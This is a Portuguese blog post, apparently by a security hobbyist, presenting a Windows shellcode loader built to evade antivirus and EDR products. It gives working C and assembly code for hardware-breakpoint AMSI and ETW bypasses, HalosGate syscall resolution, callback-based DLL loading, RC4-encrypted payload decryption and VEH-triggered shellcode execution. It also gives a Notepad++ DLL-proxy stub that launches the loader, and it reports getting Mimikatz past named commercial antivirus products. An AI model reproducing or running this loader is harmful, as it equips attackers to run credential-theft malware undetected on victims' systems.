---
title: "Post I: Hell Code Loader"
categories:
  - Malware
---


# Hell Code Loader

## Injeção de Shellcode com **VEH**, **HWBP** e **NTAPI** no Windows

Fazia um tempo que não reservo um momento para escrever algo no meu blog, então aproveitei que estou usando um novo tema e decidi publicar este artigo sobre um **loader intermediário**.

O link desse projeto está aqui: [Hell Code Loader](https://github.com/Vith0r/hell-code-loader)

O objetivo é demonstrar como esse loader pode **contornar alguns antivírus** e, possivelmente, até alguns **EDRs** mais simples.

Neste post, vamos **explorar técnicas avançadas** para evadir mecanismos de segurança do Windows, combinando **múltiplas abordagens** para alcançar a execução de código com baixa detecção.

As técnicas abordadas incluem:

- **VEH (Vectored Exception Handling)**
- **Chamadas indiretas (NTAPI para operações de memória)**
- **HalosGate para obtenção de SSNs (System Service Numbers)**
- **Carregamento de DLLs via Thread Pool Callback**

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.
## Fluxo de Injeção e Execução

1. **Verificar status do ETW** antes de alterações.
2. **Remover HWBPs** pré-existentes.
3. **Carregar DLLs** via callback.
4. **Definir HWBPs** em `AmsiScanBuffer` e `NtTraceEvent`.
5. **Registrar handler** de exceção vetorizada (`VEH`).
6. **Execução de shellcode**:
   1. `NtAllocateVirtualMemory` → aloca região **PAGE\_READWRITE**.
   2. `NtWriteVirtualMemory` → grava o shellcode criptografado.
   3. **Descriptografia** via `RC4DEC`.
   4. Gatilho de **EXCEPTION\_ACCESS\_VIOLATION**: `( (void(*)()) shellcodeMemory)();`

---

### **AMSI** (Antimalware Scan Interface)

![](https://learn.microsoft.com/pt-br/windows/win32/amsi/images/amsi7archi.jpg)

Para quem ainda não conhece a [AMSI.DLL](https://learn.microsoft.com/pt-br/windows/win32/amsi/antimalware-scan-interface-portal) é uma interface da **Microsoft** projetada para permitir que aplicativos e serviços interajam com produtos antimalware instalados.

como vamos estar executando o [mimikatz](https://github.com/ParrotSec/mimikatz) convertido para shellcode utilizando o projeto [donut](https://github.com/TheWover/donut) na memória vamos estar tendo que realizar um **patch** tanto na **AMSI.DLL** quanto no **ETW** então tenha em mente que:

#### Função **AmsiScanBuffer**

A função principal dentro da `amsi.dll` é a **AmsiScanBuffer**.

Ela recebe um ponteiro para o **buffer**, o tamanho do **buffer**, um nome de conteúdo e uma sessão de contexto. Quando essa função é chamada, o conteúdo é analisado por qualquer antimalware registrado no sistema. Se for considerado malicioso, a execução pode ser bloqueada.

No contexto de execução de payloads .NET na memória, essa função pode detectar e impedir que ferramentas como o **Mimikatz** sejam executadas. Por isso, normalmente é necessário aplicar um _patch_ nessa função para que ela sempre retorne um valor que indica que o conteúdo é seguro.

---

### **ETW** (Event Tracing for Windows)

**ETW** (Event Tracing for Windows) é um sistema de rastreamento de eventos do Windows que coleta informações detalhadas sobre o funcionamento do sistema e dos aplicativos.

Ele é amplamente utilizado para diagnósticos e também por soluções de segurança como EDRs.

#### Função **NtTraceEvent**

A função **NtTraceEvent** é a chamada de sistema utilizada internamente para registrar eventos no **ETW**.

Ela pode ser usada tanto por drivers quanto por aplicações em modo usuário para registrar eventos personalizados.
Esses eventos são coletados por listeners e ferramentas como o Windows Performance Recorder ou **EDRs** que monitoram o sistema em tempo real.

Quando se executa um código malicioso, mesmo que ele não seja detectado diretamente por uma assinatura, suas ações podem ser rastreadas via **ETW**. Por isso, desativar ou aplicar _patch_ nessa função pode ser necessário para manter a execução "oculta".

---
### Por que aplicar *patch* no AMSI?

O **AMSI** é voltado principalmente para análise de código interpretado e gerenciado em tempo de execução. Isso inclui:

- **PowerShell**
- **VBScript**
- **JavaScript**
- **Macros VBA**
- **Assemblies .NET**

Se você está só executando shellcode puro por exemplo, payloads de frameworks como [Cobalt Strike](https://www.cobaltstrike.com/) que rodam BOF/COFFs, o **AMSI** não será envolvido, e portanto não há "muita" necessidade de aplicar um bypass.

> [!note] Nota!
> Para mais detalhes, consulte a [documentação oficial da Microsoft sobre AMSI](https://learn.microsoft.com/pt-br/windows/win32/amsi/how-amsi-helps) e [ETW](https://learn.microsoft.com/windows/win32/etw/about-event-tracing).

## Implementando o HWBP Engine

Neste projeto, vamos utilizar **breakpoints de hardware** para aplicar um patch na **AMSI** e **ETW**.
Na minha experiência, essa técnica ainda é eficaz contra a maioria dos mecanismos de detecção usados por soluções **AV/EDR**.

> [!note] Nota!
> No entanto, é importante destacar que isso pode mudar a qualquer momento com o surgimento de novas abordagens de detecção.
 
Recentemente, alguns fornecedores começaram a implementar detecções baseadas em **ETWti**, utilizando chamadas como **SetThreadContext**, conforme detalhado neste [artigo](https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/).

O **Hardware Breakpoint Engine** (HWBP) permite definir breakpoints de hardware em pontos de interesse (por exemplo, `AmsiScanBuffer` e `NtTraceEvent`). Utilizamos:

```c
extern NTSTATUS NtGetContextThread(HANDLE, PCONTEXT);
extern NTSTATUS NtSetContextThread(HANDLE, PCONTEXT);

BOOL HwbpEngineBreakpoint(ULONG pos, PVOID func) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    NtGetContextThread(GetCurrentThread(), &ctx);

    if (func) {
        ((PULONG_PTR)&ctx.Dr0)[pos] = (ULONG_PTR)func;
        ctx.Dr7 |= 1ULL << (2 * pos);
    } else {
        // Remove breakpoint
        ((PULONG_PTR)&ctx.Dr0)[pos] = 0;
        ctx.Dr7 &= ~(1ULL << (2 * pos));
    }

    return NT_SUCCESS(NtSetContextThread(GetCurrentThread(), &ctx));
}
```

- **Dr0–Dr3**: endereços de breakpoint.
- **Dr7**: controle de habilitação.
## Evasão de AMSI/ETW via Breakpoints de Hardware

Ao definir breakpoints em:

- `AmsiScanBuffer` (função em `amsi.dll`)
- `NtTraceEvent` (função em `ntdll.dll`)

podemos interceptar o **EXCEPTION\_SINGLE\_STEP** e forçar um retorno de sucesso:

```c
LONG CALLBACK HwbpEngineHandler(PEXCEPTION_POINTERS info) {
    PEXCEPTION_RECORD rec = info->ExceptionRecord;
    PCONTEXT ctx = info->ContextRecord;

    if (rec->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (rec->ExceptionAddress == amsiAddr) {
            // Força AmsiScanBuffer a retornar S_OK
            ULONG_PTR ret = *(ULONG_PTR*)ctx->Rsp;
            *(ULONG*) (ctx->Rsp + 6 * sizeof(PVOID)) = 0;
            ctx->Rip = ret;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        if (rec->ExceptionAddress == etwAddr) {
            // Força NtTraceEvent a retornar STATUS_SUCCESS
            ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
            ctx->Rax = STATUS_SUCCESS;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

#### Exemplo de uso:
```c
// Definindo breakpoints
HwbpEngineBreakpoint(0, amsiAddr);
HwbpEngineBreakpoint(1, etwAddr);
ExceptionHandle = AddVectoredExceptionHandler(1, HwbpEngineHandler);
```
## HalosGate: Obtendo SSNs (Syscall Service Number)

Para obter **Syscall Service Numbers** `(SSNs)` mesmo quando as APIs da **NTDLL** estão `hookadas` vamos utilizar de base o projeto [AsmHalosGate](https://github.com/boku7/AsmHalosGate) que implementa:

1. **Resolução de Endereços**:
   - Obtém o endereço base da NTDLL
   - Localiza a tabela de exportação
   - Encontra os endereços das APIs necessárias

2. **Obtenção de SSNs**:
   - Usa `halosGateUp` e `halosGateDown` para encontrar SSNs válidos
   - Mantém os SSNs em variáveis globais para uso posterior

```c
void getSyscallInfo(char* apiName, char* apiNameStr, DWORD* SSN, PBYTE* addr) {
    *addr = (PBYTE)getApiAddr((DWORD)strlen(apiNameStr), apiNameStr, ntdll, 
                             ntdllExAddrTbl, ntdllExNamePtrTbl, ntdllExOrdinalTbl);
    
    *SSN = findSyscallNumber(*addr);
    if (*SSN == 0) {
        DWORD index = 0;
        while (*SSN == 0) {
            index++;
            *SSN = halosGateUp(*addr, (WORD)index);
            if (*SSN) {
                *SSN = *SSN - index;
                break;
            }
            *SSN = halosGateDown(*addr, (WORD)index);
            if (*SSN) {
                *SSN = *SSN + index;
                break;
            }
        }
    }
}
```

> [!note] Nota!
> Embora o código não seja perfeito e possa, ocasionalmente, ocorrer erros na obtenção de SSNs, esses problemas podem ser rapidamente solucionados.

## Carregamento de DLL via Thread Pool Callback (TpAllocWork)

Visão Geral da Abordagem

1. **Resolver** o endereço de **`LoadLibraryA`** em **`kernel32.dll`** usando `GetProcAddress`.  
2. **Recuperar** os ponteiros para **`TpAllocWork`**, **`TpPostWork`** e **`TpReleaseWork`** em **`ntdll.dll`**.  
3. **Alocar** um trabalho (`TP_WORK`) na thread pool com `TpAllocWork`, passando um callback em **assembly** que fará um **tail-call** para `LoadLibraryA`, usando o nome da DLL como `Context`.  
4. **Publicar** o trabalho com `TpPostWork` e **liberar** o objeto com `TpReleaseWork`.  
5. **Aguardar** a execução do callback para garantir que a DLL foi carregada.

> [!note] Nota!
> Para saber mais sobre o **Thread Pool** do Windows, consulte a documentação oficial: [MSDN Thread Pools](https://learn.microsoft.com/windows/win32/procthread/thread-pools).

## Implementação em C/C++

```c
#include <windows.h>
#include <stdio.h>

static FARPROC g_pLoadLibraryA = NULL;

UINT_PTR getLoadLibraryA() {
    return (UINT_PTR)g_pLoadLibraryA;
}

VOID CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance,
                           PVOID Context,
                           PTP_WORK Work);

HMODULE LoadLibraryViaCallback(const char* libName) {
    FARPROC pLoadLibraryA = GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA"
    );
    FARPROC pTpAllocWork   = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocWork");
    FARPROC pTpPostWork    = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpPostWork");
    FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpReleaseWork");

    if (!pLoadLibraryA || !pTpAllocWork || !pTpPostWork || !pTpReleaseWork) {
        printf("[-] Falha ao obter funções necessárias.\n");
        return NULL;
    }

    g_pLoadLibraryA = pLoadLibraryA;

    typedef NTSTATUS (NTAPI *TPALLOCWORK)(PTP_WORK*, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
    typedef VOID     (NTAPI *TPPOSTWORK)(PTP_WORK);
    typedef VOID     (NTAPI *TPRELEASEWORK)(PTP_WORK);

    TPALLOCWORK   TpAllocWork   = (TPALLOCWORK)pTpAllocWork;
    TPPOSTWORK    TpPostWork    = (TPPOSTWORK)pTpPostWork;
    TPRELEASEWORK TpReleaseWork = (TPRELEASEWORK)pTpReleaseWork;

    PTP_WORK work = NULL;
    NTSTATUS status = TpAllocWork(&work, WorkCallback, (PVOID)libName, NULL);
    if (status != 0) {
        printf("[-] TpAllocWork falhou: 0x%lX\n", status);
        return NULL;
    }

    TpPostWork(work);
    TpReleaseWork(work);
    Sleep(1000);

    return GetModuleHandleA(libName);
}
```
## Callback em Assembly (x64)

```asm
.code
PUBLIC WorkCallback
EXTERN getLoadLibraryA:PROC

WorkCallback PROC
    mov rcx, rdx
    xor rdx, rdx
    call getLoadLibraryA
    jmp rax
WorkCallback ENDP
```
## Descriptografia RC4

Bom, quem já viu minhas postagens anteriores sabe que não adianta, vou continuar utilizando essa **bomba**, por isso, acho que não tenho mais nada a acrescentar. 😂

```c
typedef struct _USTRING {
    ULONG Length;
    ULONG MaximumLength;
    PWSTR Buffer;
} USTRING;

typedef LONG NTSTATUS;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    USTRING* Img,
    USTRING* Key
    );

BOOL RC4DEC(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
	NTSTATUS STATUS;
	USTRING Key = { dwRc4KeySize, dwRc4KeySize, (PWSTR)pRc4Key };
	USTRING Img = { sPayloadSize, sPayloadSize, (PWSTR)pPayloadData };
	char a_dll_name[] = "Advapi32.dll";
	char NotSysFunc32[] = "SystemFunction032";

	HMODULE hModule = LoadLibraryViaCallback(a_dll_name);
	if (hModule) {
		printf("[+] %s carregada via callback: %p\n", a_dll_name, hModule);
	}
	else {
		printf("[-] Falha ao carregar %s via callback.\n", a_dll_name);
		return FALSE;
	}

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(hModule, NotSysFunc32);
	if (!SystemFunction032) {
		return FALSE;
	}

	STATUS = SystemFunction032(&Img, &Key);
	if (STATUS != 0x0) {
		return FALSE;
	}
	return TRUE;
}
```
## Ofuscação de Strings básico

Para evitar detecção por assinaturas de strings, implementamos:

1. **Strings "Fragmentadas"**:
```c
char NotNtAllocateVirtualMemoryName[] = { 
    'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 
    'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 
};
```

> [!info] Dica!
> Esta técnica "ajuda" a evitar detecção por scanners de strings estáticas, mas não é infalível! ainda mais contra uma análise dinâmica. 

## Mecanismo de Descriptografia RC4 básico

O shellcode é descriptografado usando RC4 básico para evitar detecção estática. O processo de descriptografia envolve:

1. **Primeira Camada de Descriptografia**:
```c
    DWORD dwKeySize = sizeof(KeyOuter);
    if (!RC4DEC(KeyOuter, shellcodeMemory, dwKeySize, (DWORD)bytesWritten)) {
        printf("[-] Error decrypting the first layer\n");
        return;
    }
```

2. **Dupla Camada de Descriptografia**:
```c
    DWORD dw2KeySize = sizeof(decryptionkey);
    if (!DoubleRC4Decrypt(decryptionkey, shellcodeMemory, dw2KeySize, (DWORD)bytesWritten)) {
        printf("[-] Error decrypting the second layer\n");
        return;
    }
```

3. **Descriptografia**:
- O shellcode só é descriptografado em memória
## Configurando o VEH Handler

Vamos utilizar o mecanismo de **VEH** para iniciar a **thread** do nosso shellcode.

Evitando assim o uso de métodos mais tradicionais, como `NtCreateThreadEx` ou `Queue/APC`.

O **[VEH (Vectored Exception Handler)](https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling)** será configurado para capturar exceções do tipo `EXCEPTION_ACCESS_VIOLATION`, que vai ocorrer ao tentar executar uma região de memória marcada como [não-executável](https://learn.microsoft.com/pt-br/windows/win32/memory/memory-protection-constants).

Quando a exceção for gerada, redirecionamos manualmente o registrador **RIP** para o endereço onde o shellcode foi previamente alocado.

Essa abordagem permite executar o shellcode de forma mais "furtiva", explorando o fluxo "natural" de exceções do processo:

<div align=center>
  <img alt="msg" src="https://i.imgur.com/Az2Ns6t.png">
</div>

```c
LONG CALLBACK VehHandler(PEXCEPTION_POINTERS info) {
    if (info->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION && !executed) {
        SIZE_T size = shellcodeSize;
        // Altera PAGE_READWRITE para PAGE_EXECUTE_READ
        NtProtectVirtualMemory(GetCurrentProcess(), &shellcodeMemory, &size, PAGE_EXECUTE_READ, &oldProt);
        // Redireciona RIP para o shellcode
        info->ContextRecord->Rip = (DWORD64) shellcodeMemory;
        executed = TRUE;
        RemoveVectoredExceptionHandler(handlerHandle);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

E registramos:

```c
handlerHandle = AddVectoredExceptionHandler(1, VehHandler);
```

---

> [!danger] Aviso!
> EDRs avançados conseguem detectar uso abusivo de **breakpoints de hardware** e **VEH**. 
## Testes do loader contra AV/EDR

Vou realizar a execução do [mimikatz](https://github.com/ParrotSec/mimikatz) convertido para shellcode, utilizando o projeto [donut](https://github.com/TheWover/donut).

Lembre-se de desativar o bypass **AMSI/WLDP/ETW** do **donut** caso queira fazer uso desse projeto, senão ele será facilmente detectado!"<br>

| Antivírus | Ranking dos "Melhores" | Prêmios e Reconhecimentos 2024 |
|:----------|:-----------------------|:-------------------------------|
| [ESET HOME Security Essential](https://www.eset.com/) | 🥇 1º lugar | 🏆 Produto do Ano 2024 pela AV-Comparatives |
| [Sophos Endpoint](https://www.sophos.com) | 🥈 2º lugar | 🏆 Approved Enterprise & Business Security Product 2024 pela AV-Comparatives |
| [Bitdefender Endpoint Security](https://www.bitdefender.com) | 🥉 3º lugar | 🏆 Approved Enterprise & Business Security Product 2024 pela AV-Comparatives |
| [Trend Micro Max Security](https://www.trendmicro.com) | 4º lugar | 🏆 Top-Rated Product 2024 pela AV-Comparatives |
| [Bitdefender Total Security](https://www.bitdefender.com) | 5º lugar | 🏆 Top-Rated Product 2024 pela AV-Comparatives |
| [Avira Antivirus Pro](https://www.avira.com) | 6º lugar | 🏆 Approved Security Product 2024 pela AV-Comparatives |
| [Malwarebytes Standard](https://www.malwarebytes.com) | 7º lugar | 🏆 Approved Security Product 2024 pela AV-Comparatives |
| [TotalAV](https://www.totalav.com) | 8º lugar | 🏆 Approved Security Product 2024 pela AV-Comparatives |
| [F-Secure Anti-Virus](https://www.f-secure.com) | 9º lugar | 🏆 Approved Security Product 2024 pela AV-Comparatives |

---

> **Nota:** Ranking baseado em premiações independentes (AV-Comparatives 2024) e reputação no mercado em 2024.

<iframe width="760" height="515" src="https://www.youtube.com/embed/4EGTEp_hLz0" frameborder="0" allowfullscreen></iframe>

## Loader + Dll Proxy

Bom, quando executei o loader no **Bitdefender Total Security** e no **Bitdefender Endpoint Security**, ele foi detectado. Então, decidi tentar realizar o proxy de DLL no **Notepad++** como mostrei em outras postagens. Fiz apenas isso e contornou a detecção.

<iframe width="760" height="515" src="https://www.youtube.com/embed/K0fJ3RusIb8" frameborder="0" allowfullscreen></iframe>

---
### Código para realizar o proxy de dll no Notepad++

```c
#define _CRT_SECURE_NO_DEPRECATE
#pragma warning(disable : 4996)

#pragma comment(linker, "/export:beNotified=Dlloriginal.beNotified,@1")
#pragma comment(linker, "/export:getFuncsArray=Dlloriginal.getFuncsArray,@2")
#pragma comment(linker, "/export:getName=Dlloriginal.getName,@3")
#pragma comment(linker, "/export:isUnicode=Dlloriginal.isUnicode,@4")
#pragma comment(linker, "/export:messageProc=Dlloriginal.messageProc,@5")
#pragma comment(linker, "/export:setInfo=Dlloriginal.setInfo,@6")
```

```c
void OpenDebugConsole(void) {
    if (AllocConsole()) {
        freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
        freopen_s((FILE**)stderr, "CONOUT$", "w", stderr);
        freopen_s((FILE**)stdin, "CONIN$", "r", stdin);
        SetConsoleTitleA("Notepad++ Proxy Console");
    }
}

DWORD WINAPI DoMagic(LPVOID lpParameter) {
    OpenDebugConsole();
    printf("[+] Proxy-DLL carregada em Notepad++\n");
    H3ll();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    HANDLE threadHandle;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(
            NULL,
            0,
            DoMagic,
            NULL,
            0,
            NULL
        );
        if (threadHandle) CloseHandle(threadHandle);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

## Finalização

Bom, gostei bastante de fazer esse projetinho no meu tempo livre. Acho que ainda não perdi o jeito de escrever esses “papers” pouco profissionais e documentados, mas não ligo. continuo gostando de fazer isso. Então, é isso. nos vemos na próxima postagem, espero que seja melhor do que essa.

![até](https://media1.tenor.com/m/NeDVrlWmAegAAAAC/squarepants-bob-sponge-see-you-later.gif)
